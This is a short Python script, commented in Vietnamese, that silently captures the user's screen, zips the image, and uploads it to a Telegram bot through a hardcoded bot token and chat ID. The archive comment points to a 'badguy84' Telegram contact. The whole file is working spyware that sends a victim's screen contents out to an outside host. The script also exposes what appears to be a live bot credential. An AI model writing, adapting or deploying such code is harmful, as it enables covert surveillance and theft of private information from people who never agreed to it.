import os
import io
import pyautogui
import requests
from datetime import datetime
import zipfile

# Bot token và chat ID của bạn
TOKEN_BOT = "8152000971:AAHtPgiB0Vx8PX8b6aFIgmQUkFtBLYsQ-CM"
CHAT_ID_NEW = "1773070934"

# Hàm chụp ảnh màn hình và lưu vào bộ nhớ tạm
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    img_byte_array = io.BytesIO()
    screenshot.save(img_byte_array, format='PNG')
    img_byte_array.seek(0)
    return img_byte_array

# Hàm nén dữ liệu và trả về byte stream
def create_zip(data_stream, filename):
    zip_stream = io.BytesIO()
    with zipfile.ZipFile(zip_stream, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zip_file:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        zip_file.comment = f"Time Created: {timestamp}\nContact: https://t.me/badguy84".encode()
        zip_file.writestr(filename, data_stream.read())
    zip_stream.seek(0)
    return zip_stream

# Hàm gửi file tới Telegram
def send_to_telegram(zip_stream, zip_filename):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendDocument"
    files = {
        'chat_id': (None, CHAT_ID_NEW),
        'document': (zip_filename, zip_stream, 'application/zip')
    }
    response = requests.post(url, files=files)
    return response.status_code, response.text

if __name__ == "__main__":
    try:
        # Chụp ảnh màn hình
        screenshot_stream = capture_screenshot()

        # Tạo file ZIP chứa ảnh màn hình
        zip_filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        zip_stream = create_zip(screenshot_stream, "screenshot.png")

        # Gửi file ZIP đến Telegram
        status_code, response_text = send_to_telegram(zip_stream, zip_filename)

        if status_code == 200:
            print("Screenshot sent successfully!")
        else:
            print(f"Failed to send screenshot: {response_text}")
    except Exception as e:
        print(f"Error: {e}")
